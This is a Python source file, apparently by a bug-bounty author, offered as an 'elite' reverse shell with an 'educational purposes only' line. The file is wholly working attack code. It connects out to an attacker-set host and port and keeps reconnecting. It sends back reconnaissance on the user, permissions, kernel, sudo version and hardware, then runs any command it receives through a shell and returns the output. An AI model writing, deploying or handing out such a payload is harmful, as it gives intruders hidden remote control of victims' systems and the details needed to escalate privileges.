#!/usr/bin/env python3
# Advanced Reverse Shell (Educational Purposes Only)
# Highly Elite Reverse Shell (Strongest more than metasploit payloads!)
# Tested on : Debian 14.2.0-16 (Linux)
# Author: Hamza Mahmoud (bugbounty88)
# Modified Data 18/7/2025
# Last Version : 2.3

import socket
import time
import subprocess
import os
import json
import platform
import sys
import ssl
from threading import Thread
from queue import Queue

# ========== Color Settings ==========
class Colors:
    BLUE = "\033[34m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    RESET = "\033[0m"

# ========== Connection Settings ==========
class Config:
    HOST = "127.0.0.1"  # Change this to attacker's IP (localhost for testing)
    PORT = 4444         # Change this to attacker's PORT
    RECONNECT_DELAY = 5  # Seconds between connection attempts
    BUFFER_SIZE = 1024 * 4  # Data packet size
    USE_SSL = False  # Enable for encrypted connection (Still in test - don't use it now)
    SSL_CERT = None  # Path to SSL certificate (if used)

# ========== System Information Gathering ==========
def get_system_info():
    info = {
        "user": subprocess.getoutput("whoami"),
        "permissions": subprocess.getoutput("id"),
        "kernel": subprocess.getoutput("uname -r"),
        "sudo_version": subprocess.getoutput("sudo --version | grep 'Sudo version '"),
        "os": platform.platform(),
        "execution_dir": subprocess.getoutput("pwd"),
        "language": subprocess.getoutput("echo $LANG"),
        "bios_version": subprocess.getoutput("cat /sys/devices/virtual/dmi/id/bios_version"),
        "computer_vendor": subprocess.getoutput("cat /sys/devices/virtual/dmi/id/board_vendor"),
        "networkmanger_version": subprocess.getoutput("NetworkManager --version"),
        "hostname": socket.gethostname(),
        "python_version": sys.version,
    }
    return json.dumps(info, indent=2)

# ========== Command Execution ==========
def execute_command(cmd):
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        return result.stdout if result.stdout else result.stderr
    except subprocess.CalledProcessError as e:
        return f"Error: {e.stderr}" if e.stderr else f"Command failed with code {e.returncode}"

# ========== Reverse Shell Connection ==========
class ReverseShell:
    def __init__(self):
        self.socket = None
        self.connection_active = False
        self.command_queue = Queue()

    def connect(self):
        while True:
            try:
                # Create socket connection
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                if Config.USE_SSL:
                    context = ssl.create_default_context()
                    if Config.SSL_CERT:
                        context.load_verify_locations(Config.SSL_CERT)
                    self.socket = context.wrap_socket(self.socket, server_hostname=Config.HOST)
                
                self.socket.connect((Config.HOST, Config.PORT))
                self.connection_active = True
                self.send_data(Colors.GREEN + "[+] Welcome to BLOOD-x-NIGHTMARE\n" + Colors.RESET)
                self.send_data(Colors.GREEN + "[+] Successfully connected to server\n" + Colors.RESET)
                self.send_data(get_system_info())
                print("[+] Succsesfully connected to server.")
                return True
                
            except Exception as e:
                self.send_data(Colors.RED + f"[-] Connection failed: {str(e)}" + Colors.RESET)
                self.send_data(f"Retrying in {Config.RECONNECT_DELAY} seconds...")
                time.sleep(Config.RECONNECT_DELAY)

    def send_data(self, data):
        try:
            if isinstance(data, str):
                data = data.encode()
            self.socket.send(data + b"")
        except Exception as e:
            self.connection_active = False
            raise e

    def receive_commands(self):
        while self.connection_active:
            try:
                command = self.socket.recv(Config.BUFFER_SIZE).decode().strip()
                
                if command.lower() in ["exit", "quit"]:
                    self.connection_active = False
                    self.socket.close()
                    break
                
                self.command_queue.put(command)
            except Exception as e:
                self.connection_active = False
                self.send_data(Colors.RED + f"[-] Command receive error: {str(e)}" + Colors.RESET)
                break

    def process_commands(self):
        while self.connection_active:
            if not self.command_queue.empty():
                command = self.command_queue.get()
                
                if command == "background":
                    continue
                
                try:
                    output = execute_command(command)
                    if subprocess.getoutput("whoami") == "root":
                        prompt = "root@shell# "
                        self.send_data(output + prompt)
                    else:
                        prompt = subprocess.getoutput("whoami") + "@shell$ "
                        self.send_data(output + prompt)
                except Exception as e:
                    self.send_data(f"Error: {str(e)}")

    def start(self):
        try:
            while True:
                if self.connect():
                    # Start thread for receiving commands
                    receiver = Thread(target=self.receive_commands)
                    receiver.daemon = True
                    receiver.start()
                    
                    # Process commands in main thread
                    self.process_commands()
                    
                if not self.connection_active:
                    self.send_data("Attempting to reconnect...")
                    time.sleep(Config.RECONNECT_DELAY)
                    
        except KeyboardInterrupt:
            self.send_data("\n[-] Connection terminated by user")
            if self.socket:
                self.socket.close()
            sys.exit(0)
        except OSError:
            print("[-] Session closed or may connection failed.")
            time.sleep(1)


# ========== Main Execution ==========
if __name__ == "__main__":
    os.system("clear")
    shell = ReverseShell()
    shell.start()
